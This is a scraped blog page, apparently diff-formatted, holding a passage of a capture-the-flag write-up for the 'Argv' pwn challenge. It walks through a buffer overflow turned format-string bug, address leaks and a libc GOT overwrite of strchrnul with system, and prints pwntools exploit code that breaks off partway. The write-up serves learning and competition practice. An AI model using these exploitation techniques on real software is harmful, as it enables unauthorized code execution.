hover:text-white" href=/tags/gotoverwrite/>Got overwrite</a></li><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white" href=/tags/houseofhusk/>Houseof husk</a></li><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white" href=/tags/libcgotoverwrite/>Libc got overwrite</a></li><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white" href=/tags/stackleak/>Stack leak</a></li></ul></div><div class="lg:col-6 flex items-center lg:justify-end"><h5>Share :</h5><div class=share-icons><a class="share-link share-facebook" href="https://facebook.com/sharer/sharer.php?u=%2fblog%2fimaginaryctf%2fargv%2f" target=_blank rel=noopener aria-label="share facebook"><span class=share-icon><svg viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>
-</span></a><a class="share-link share-x" href="https://x.com/intent/tweet/?text=ImaginaryCTF%20Argv%20Pwn%20Writeup&amp;url=%2fblog%2fimaginaryctf%2fargv%2f" target=_blank rel=noopener aria-label="share x"><span aria-hidden=true class=share-icon><svg viewBox="0 0 24 24"><path d="M8 2H1l8.26 11.015L1.45 22H4.1l6.388-7.349L16 22h7l-8.608-11.478L21.8 2h-2.65l-5.986 6.886zm9 18L5 4h2l12 16z"/></svg>
-</span></a><a class="share-link share-email" href="mailto:?subject=ImaginaryCTF%20Argv%20Pwn%20Writeup&amp;body=%2fblog%2fimaginaryctf%2fargv%2f" target=_self rel=noopener aria-label="share email"><span aria-hidden=true class=share-icon><svg viewBox="0 0 24 24"><path d="M22 4H2C.9 4 0 4.9.0 6v12c0 1.1.9 2 2 2h20c1.1.0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17.0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1.0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08.0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z"/></svg>
-</span></a><span class=fediverse-share><a class="share-link share-fediverse" href=javascript:void(0); onclick=toggleFediverseInput(this) aria-label="share fediverse"><span aria-hidden=true class=share-icon><svg viewBox="-10 -5 1034 1034" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"/><g id="SVGRepo_iconCarrier"><path d="M539 176q-32 0-55 22t-25 55 20.5 58 56 27 58.5-20.5 27-56-20.5-59T544 176h-5zm-87 95-232 118q20 20 25 48l231-118q-19-20-24-48zm167 27q-13 25-38 38l183 184q13-25 39-38zM477 320 342 585l40 40 143-280q-28-5-48-25zm104 16q-22 11-46 10l-8-1 21 132 56 9zM155 370q-32 0-55 22.5t-25 55 20.5 58 56.5 27 59-21 26.5-56-21-58.5-55.5-27h-6zm90 68q1 9 1 18-1 19-10 35l132 21 26-50zm225 36-26 51 311 49q-1-8-1-17 1-19 10-36zm372 6q-32 1-55 23t-24.5 55 21 58 56 27 58.5-20.5 27-56.5-20.5-59-56.5-27h-6zM236 493q-13 25-39 38l210 210 51-25zm-40 38q-21 11-44 10l-9-1 40 256q21-10 45-9l8 1zm364 22 48 311q21-10 44-9l10 1-46-294zm195 23-118 60 8 56 135-68q-20-20-25-48zm26 49-119 231q28 5 48 25l119-231q-28-5-48-25zM306 654l-68 134q28 5 48 25l60-119zm262 17-281 143q19 20 24 48l265-135zM513 771l-51 25 106 107q13-25 39-38zM222 795q-32 0-55.5 22.5t-25 55 21 57.5 56 27 58.5-20.5 27-56-20.5-58.5-56.5-27h-5zm89 68q2 9 1 18-1 19-9 35l256 41q-1-9-1-18 1-18 10-35zm335 0q-32 0-55 22.5t-24.5 55 20.5 58 56 27 59-21 27-56-20.5-58.5-56.5-27h-6z"/></g></svg>
-</span></a><span class=fediverse-input-wrapper style=display:none><input type=text placeholder="Enter Fediverse Instance URL" class=fediverse-input onkeypress='handleFediverseShare(event,"/blog/imaginaryctf/argv/","ImaginaryCTF Argv Pwn Writeup")'>
-<button class=fediverse-check-button onclick='handleFediverseShareButton(this,"/blog/imaginaryctf/argv/","ImaginaryCTF Argv Pwn Writeup")'>
-Share
-</button>
-</span></span><button class="share-link share-copy" onclick='copyToClipboard(this,"/blog/imaginaryctf/argv/")'>
-<span class=share-icon><svg viewBox="0 0 24 24"><path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1s-2.4.84-2.82 2H5c-1.1.0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1.0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7-1c.55.0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 17H5V5h14v14z"/></svg></span></button></div><script>function toggleFediverseInput(e){const n=e.closest(".fediverse-share"),t=n.querySelector(".fediverse-input-wrapper");t.style.display=t.style.display==="none"?"block":"none"}function handleFediverseShare(e,t,n){if(e.key==="Enter"){const o=e.target;let s=o.value.trim();if(s){s.startsWith("https://")||(s=`https://${s}`);const e=`${s}/share?text=${encodeURIComponent(n)}&url=${encodeURIComponent(t)}`;window.open(e,"_blank","noopener")}}}function handleFediverseShareButton(e,t,n){const o=e.previousElementSibling;let s=o.value.trim();if(s){s.startsWith("https://")||(s=`https://${s}`);const e=`${s}/share?text=${encodeURIComponent(n)}&url=${encodeURIComponent(t)}`;window.open(e,"_blank","noopener")}}function copyToClipboard(e,t){navigator.clipboard.writeText(t).then(()=>{const t=e.querySelector("svg path"),n="M19 3h-4.18C14.4 1.84 13.3 1 12 1s-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7-1c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 17H5V5h14v14z",s="M9 16.2l-3.5-3.5-1.4 1.4L9 19 20 8l-1.4-1.4L9 16.2z";t.setAttribute("d",s),setTimeout(()=>{t.setAttribute("d",n)},1e3)})}</script></div></div><div class=mt-20><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//themefisher-template.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div><div class="section pb-0"><h2 class="h3 mb-12">Related Posts</h2><div class=row><div class="lg:col-4 md:col-6 mb-14"><div class="bg-body dark:bg-darkmode-body"><picture><source srcset=/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_9cf6a42dbd7c6974.webp media="(max-width: 575px)"><source srcset=/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_8743e8561dd8e1ef.webp media="(max-width: 767px)"><source srcset=/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_28b8a5b7e3561fd8.webp media="(max-width: 991px)"><source srcset=/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_88543f4bd461388a.webp><img loading=lazy decoding=async src=/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_f4febf90c2966447.png class="mb-6 w-full rounded img" alt="ShmooCon CTF" width=1179 height=551></picture><h4 class=mb-3><a href=/blog/shmooconctf/shmooconctf/>ShmooCon CTF</a></h4><ul class=mb-4><li class="mr-4 inline-block"><a href=/authors/zerofrost/><i class="fa-regular fa-circle-user mr-2"></i>zerofrost</a></li><li class="mr-4 inline-block"><i class="fa-regular fa-folder mr-1"></i>
-<a href=/categories/ctf/ class=ms-1>Ctf</a></li></ul><p class=mb-6>Over the recent weekend, I found some free time that enabled me to participate in the ShmooCon CTF. While it did not have pwn challenges as I had hoped, they offered a variety of challenges I enjoyed solving. This blogpost is a walkthrough of some of the challenges I managed to solve.</p><a class="btn btn-outline-primary btn-sm" href=/blog/shmooconctf/shmooconctf/>Read More</a></div></div><div class="lg:col-4 md:col-6 mb-14"><div class="bg-body dark:bg-darkmode-body"><picture><source srcset=/images/CrewCtf_Writeups/01_hu_58e35c1cf2ae95e1.webp media="(max-width: 575px)"><source srcset=/images/CrewCtf_Writeups/01_hu_fcd1713ab4661ea3.webp media="(max-width: 767px)"><source srcset=/images/CrewCtf_Writeups/01_hu_5dcd1420a269c5e5.webp media="(max-width: 991px)"><source srcset=/images/CrewCtf_Writeups/01_hu_e608ea8504102a32.webp><img loading=lazy decoding=async src=/images/CrewCtf_Writeups/01_hu_f53fd9d45ac7f35b.jpg class="mb-6 w-full rounded img" alt="CrewCtf Writeups" width=1146 height=574></picture><h4 class=mb-3><a href=/blog/crewctf_writeups/2023-07-11-crewctf-writeups/>CrewCtf Writeups</a></h4><ul class=mb-4><li class="mr-4 inline-block"><a href=/authors/zerofrost/><i class="fa-regular fa-circle-user mr-2"></i>zerofrost</a></li><li class="mr-4 inline-block"><i class="fa-regular fa-folder mr-1"></i>
-<a href=/categories/ctf/ class=ms-1>Ctf
-,
-</a><a href=/categories/crewctf/ class=ms-1>Crewctf</a></li></ul><p class=mb-6>It has been a while since I last participated in a CTF (Capture The Flag) competition. With a few moments to spare this weekend, I decided to immerse myself in CrewCTF by theHackersCrew CTF team. Their event offered a diverse range of challenges, but I chose to focus primarily on the fascinating field of forensics. In this blog, I will share my approach and solutions for the different challenges I managed to solve.</p><a class="btn btn-outline-primary btn-sm" href=/blog/crewctf_writeups/2023-07-11-crewctf-writeups/>Read More</a></div></div></div></div></div></section></main><footer class="bg-light dark:bg-darkmode-light"><div class=container><div class="row items-center py-10"><div class="lg:col-3 mb-8 text-center lg:mb-0 lg:text-left"><a class="navbar-brand inline-block" href=/>zerofrost</a></div><div class="lg:col-6 mb-8 text-center lg:mb-0"><ul><li class="m-3 inline-block"><a href=/about>About</a></li></ul></div><div class="lg:col-3 mb-8 text-center lg:mb-0 lg:mt-0 lg:text-right"><ul class=social-icons><li><a target=_blank aria-label=facebook rel="nofollow noopener" href=https://www.facebook.com/><i class="fab fa-facebook"></i></a></li><li><a target=_blank aria-label=twitter rel="nofollow noopener" href=https://twitter.com/xubzer0><i class="fab fa-twitter"></i></a></li><li><a target=_blank aria-label=github rel="nofollow noopener" href=https://www.github.com/allannjuguna><i class="fab fa-github"></i></a></li><li><a target=_blank aria-label=linkedin rel="nofollow noopener" href=https://www.linkedin.com/><i class="fab fa-linkedin"></i></a></li></ul></div></div></div><div class="border-border dark:border-darkmode-border border-t py-7"><div class="text-text-light dark:text-darkmode-text-light container text-center"><p>Powered by Hugo</p></div></div></footer><script crossorigin=anonymous integrity="sha256-LO9JECYLqyMcpGlrtxZcpUn0I8AvhO6oIIibJZv4zbk=" src=/js/script.min.2cef4910260bab231ca4696bb7165ca549f423c02f84eea820889b259bf8cdb9.js></script><script defer async crossorigin=anonymous integrity="sha256-5VBZe/VmPQWXcchTWy6cUTaJdnltCLjAbCqDnX+XWoQ=" src=/js/script-lazy.min.e550597bf5663d059771c8535b2e9c51368976796d08b8c06c2a839d7f975a84.js></script><script>"serviceWorker"in navigator&&navigator.serviceWorker.register("/service-worker.js")</script></body></html>
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110205411.png" alt=""></p>
+<p>From the above screenshot, we can see that our input was printed on the screen!! We can use this as a way to:</p>
+<ul>
+<li>Leak addresses in the GOT e.g. <code>elf.got.gets</code> (overwrite the argv string pointer with elf.got.gets)</li>
+<li>Convert it to a format string vulnerability turning it into an arbitrary write primitive, after all it uses <code>printf</code> on attacker-controlled input. (ovewrite the argv string pointer with the stack address of where the buffer starts)</li>
+</ul>
+<p>With a confirmed format string vulnerability, we can find the injection point as follows
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110210120.png" alt="">
+From the above results, the injection point is at <code>8</code></p>
+<h3 id="leaking-addresses">Leaking Addresses</h3>
+<p>With the format string vulnerability, we can:</p>
+<ul>
+<li>Print the got addresses of functions like <code>gets</code> and <code>printf</code></li>
+<li>Calculate the libc base address</li>
+<li>Calculate the address of functions and strings we may need later, e.g. <code>system</code> and <code>/bin/sh</code></li>
+<li>We also need to find a way to leak stack addresses, for this we may also need the address of <code>libc.sym.environ</code></li>
+</ul>
+<blockquote>
+<p>There is a symbol <code>environ</code> in libc, whose value is the same as the third argument of <code>main</code> function, <code>char **envp</code>.</p></blockquote>
+<p>Printing the got address of <code>gets</code> is as easy as follows</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[*] Stage 1: Leak libc addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">got</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">gets</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># Parse the leaked address and calculate libc addresses</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">gets_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>)))) 
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">gets_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span>[<span style="color:#98c379">&#39;gets&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">system</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">puts</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">exit_fn</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">symbols</span>[<span style="color:#98c379">&#39;exit&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">binsh</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">next</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">search</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#39;/bin/sh</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">environ</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sym</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">environ</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked gets got address: &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">gets_leak</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Libc_addr base address at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">libc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">address</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found system at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">system</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found puts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">puts</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found exit_fn at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">exit_fn</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found shell at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">binsh</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Found environ at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">environ</span>)))
+</span></span></code></pre></div><p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110211150.png" alt=""></p>
+<p>We can leak a stack address just like we leaked the <code>gets</code> got address, this time using the <code>environ</code> address, and we will receive a stack address. Using this address, we will be able to calculate where our buffer starts in the stack etc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#56b6c2">.....</span><span style="color:#e06c75">SNIP</span><span style="color:#56b6c2">.......</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 2: Leak stack addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">environ</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">stack_leak</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">int</span>((<span style="color:#e06c75">u64</span>(<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recv</span>(<span style="color:#d19a66">0x8</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">ljust</span>(<span style="color:#d19a66">8</span>,<span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span>))))
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">buffer_start</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">stack_leak</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x178</span> <span style="color:#7f848e"># Distance from the leaked addr to the start of our buffer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Leaked stack address : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">stack_leak</span>)))
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Buffer starts at : &#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e5c07b">hex</span>(<span style="color:#e06c75">buffer_start</span>)))
+</span></span></code></pre></div><p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110213155.png" alt=""></p>
+<h3 id="buffer-overflow-to-format-string">Buffer Overflow to Format String</h3>
+<p>Just like before in the debugging process, we can now convert our buffer overflow to a format string vulnerability by overwriting the <code>argv[0]</code> with the address of where our buffer starts. This time I used <code>NULL</code> values instead of <code>A's</code> for better visibility on what is written on the stack</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#56b6c2">.....</span><span style="color:#e06c75">SNIP</span><span style="color:#56b6c2">.....</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\x00</span><span style="color:#98c379">&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">buffer_start</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span></code></pre></div><p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110213601.png" alt="">
+Initially, we get the address we sent in our payload as the output, but later, our input starts being passed to <code>printf</code>, we can verify by sending format string payloads which then leak values on the stack. Now that we have this format string vulnerability, we can convert it into an arbitrary write.</p>
+<h3 id="method-1-arbitrary-write-to-libc-got">Method 1: Arbitrary Write to LIBC Got</h3>
+<blockquote>
+<p>This was the method I used to solve this challenge, however, it was not the intended solution</p></blockquote>
+<p>Since the binary is compiled with <code>FULL RERLO</code>, we cannot overwrite GOT entries in the binary, however, we can overwrite LIBC Got entries since the last region of libc is marked as writable. Looking at the addresses in the region, we see two interesting address <code>0x00007ffff7f157e0</code> and <code>0x00007ffff7f15400</code> pointing to <code>strlen</code> and <code>strchrnul</code> respectively.</p>
+<p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110214053.png" alt=""></p>
+<p>Mostly, I try to overwrite the <code>strlen</code> address with the address of let&rsquo;s say <code>system</code> since <code>strlen</code> is called in functions such as <code>puts</code> and <code>printf(sometimes)</code>. Moreover, it is similar to <code>system</code> in that they both take a pointer to a string as their first parameter e.g <code>/bin/sh</code>. Using our arbitrary write, let&rsquo;s overwrite it with a custom value e.g <code>0xdeadbeef</code> for testing</p>
+<p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110214633.png" alt=""></p>
+<p>After overwriting the address with <code>0xdeadbeef</code> and proceeding with execution, entering any input does not trigger our redirection to <code>0xdeadbeef</code> meaning <code>strlen</code> is not called, despite printing values with <code>printf</code>. This is because <code>strlen</code> is only called when <code>printf</code> is called with the <code>%s</code> format string. So to trigger <code>strlen</code>, we can enter <code>%s</code> as our input.</p>
+<p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110215021.png" alt=""></p>
+<p>From the above image, we can see our last input which triggered <code>strlen</code> i.e. <code>%s</code>, and we can also confirm that we were redirected to <code>0xdeadbeef</code>. With this, we can swap <code>0xdeadbeef</code> with a one-gadget address and get a shell. But it was not that easy this time due to the strict constraints
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110215248.png" alt=""></p>
+<p>Also, we cannot call <code>system</code> because the value of <code>rdi</code> is <code>0x1</code> instead of being an address pointing to a string, hmm , weird.
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110215429.png" alt=""></p>
+<p>We can retry using the other address we found (<code>strchrnul</code>). Looking at the man pages, we can see that it takes a pointer to a string as its first parameter. Let&rsquo;s overwrite it with <code>0xdeadbeef</code> and see what happens
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110215743.png" alt=""></p>
+<p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110215943.png" alt=""></p>
+<p>Continuing with execution and entering a string <code>test</code>, we are redirected to <code>0xdeadbeef</code>, and not only that, our <code>rdi</code> parameter is now set to the last string we entered as input, nice!!!
+<img src="/images/ImaginaryCTF_-_Argv/Pasted_20241110220130.png" alt=""></p>
+<p>Now all we need is to update our script to replace the got address of <code>strchrnul</code> with <code>system</code> and then send the string <code>/bin/sh</code>. Below is the final exploit to trigger the shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#7f848e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">pwn</span> <span style="color:#c678dd">import</span> <span style="color:#56b6c2">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">context</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">update</span>(<span style="color:#e06c75">arch</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;amd64&#34;</span>,<span style="color:#e06c75">os</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;linux&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">filename</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;./argv&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">libc</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">ELF</span>(<span style="color:#98c379">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style="color:#e06c75">checksec</span><span style="color:#56b6c2">=</span><span style="color:#e5c07b">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">elf</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ELF</span>(<span style="color:#e06c75">filename</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">process</span>(<span style="color:#e06c75">filename</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">write_64</span>(<span style="color:#e06c75">write_location</span>,<span style="color:#e06c75">write_value</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">fmtstr_payload</span>(<span style="color:#d19a66">8</span>,{ <span style="color:#7f848e"># injection == 8</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">write_location</span>:<span style="color:#e06c75">write_value</span>
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[*] Stage 1: Leak libc addresses&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">payload</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;A&#34;</span> <span style="color:#56b6c2">*</span> (<span style="color:#d19a66">360</span>) <span style="color:#56b6c2">+</span> <span style="color:#e06c75">p64</span>(<span style="color:#e06c75">elf</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">got</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">gets</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">payload</span>)
